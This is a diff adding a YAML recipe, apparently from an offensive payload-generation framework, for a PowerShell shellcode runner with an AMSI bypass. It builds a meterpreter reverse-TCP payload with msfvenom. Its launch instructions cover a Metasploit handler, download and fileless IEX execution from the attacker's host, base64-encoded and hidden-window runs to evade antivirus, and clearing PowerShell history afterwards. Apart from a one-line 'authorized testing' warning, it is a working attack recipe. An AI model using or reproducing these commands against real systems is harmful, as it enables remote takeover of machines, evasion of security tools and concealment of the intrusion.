@@ -1,0 +1,154 @@
+meta:
+  name: "Simple Shellcode Runner (PowerShell)"
+  category: "Shellcode Execution"
+  description: |
+    Simple shellcode runner in PowerShell with AMSI bypass and reflection-based API loading.
+    
+    Features:
+    - AMSI bypass to evade AV/EDR script scanning
+    - Dynamic API resolution via reflection (no P/Invoke signatures)
+    - Direct shellcode execution via VirtualAlloc + CreateThread
+    - Fileless execution capability
+    
+    This runner is useful when PowerShell is available but compiled executables
+    are restricted. Uses reflection to avoid static API signatures.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: medium
+
+  mitre:
+    tactic: "TA0002 - Execution"
+    technique: "T1059.001 - PowerShell"
+
+  artifacts:
+    - "PowerShell execution with suspicious scripts"
+    - "AMSI bypass patterns"
+    - "Reflection-based API resolution"
+    - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
+    - "CreateThread API calls"
+    - "Network connection to C2 server"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "output_file"
+    type: "string"
+    description: "Output PowerShell script filename"
+    required: false
+    default: "runner.ps1"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: Format shellcode as PowerShell byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_powershell.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "powershell_payload"
+
+output:
+  type: "template"
+  template: "shellcode_runner/simple_runner.ps1"
+  compile:
+    enabled: false
+  launch_instructions: |
+    PowerShell Simple Shellcode Runner - Launch Instructions
+
+    Step 1: Start Metasploit Listener
+
+    Start msfconsole and configure the handler:
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Or manually in msfconsole:
+
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST {{ lhost }}
+    set LPORT {{ lport }}
+    set ExitOnSession false
+    exploit -j
+
+    Step 2: Transfer Script to Target
+
+    Transfer the generated PowerShell script to the target Windows system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target (PowerShell):
+    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+
+    Step 3: Execute on Target
+
+    Run with execution policy bypass:
+    powershell.exe -ExecutionPolicy Bypass -File {{ output_file }}
+
+    Or use dot-sourcing:
+    powershell.exe -ExecutionPolicy Bypass -Command ". .\{{ output_file }}"
+
+    Fileless execution (no file drop):
+    powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
+
+    Step 4: Verify Connection
+
+    Check your Metasploit console for incoming session:
+    Sending stage (200262 bytes) to [target_ip]
+    Meterpreter session 1 opened
+
+    Notes:
+
+    - Includes AMSI bypass to evade script scanning
+    - Uses reflection for dynamic API resolution
+    - No static P/Invoke signatures (helps evade some AV)
+    - EXITFUNC=thread ensures clean exit
+    - PowerShell execution may be logged by Windows Event Logs
+
+    Troubleshooting:
+
+    - If AMSI blocks: The bypass may be detected, consider obfuscation
+    - If no connection: Check firewall rules on attacker machine
+    - If script blocked: Try encoding or obfuscation techniques
+    - Requires x64 Windows system
+    - May need to disable real-time protection for testing
+
+    Alternative Execution Methods:
+
+    Encoded command (helps bypass simple AV):
+    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content {{ output_file }} -Raw)))
+    powershell.exe -EncodedCommand $encoded
+
+    Hidden window:
+    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File {{ output_file }}
+
+    Cleanup:
+
+    After testing, remove the script:
+    Remove-Item {{ output_file }} -Force
+
+    Clear PowerShell history:
+    Remove-Item (Get-PSReadlineOption).HistorySavePath
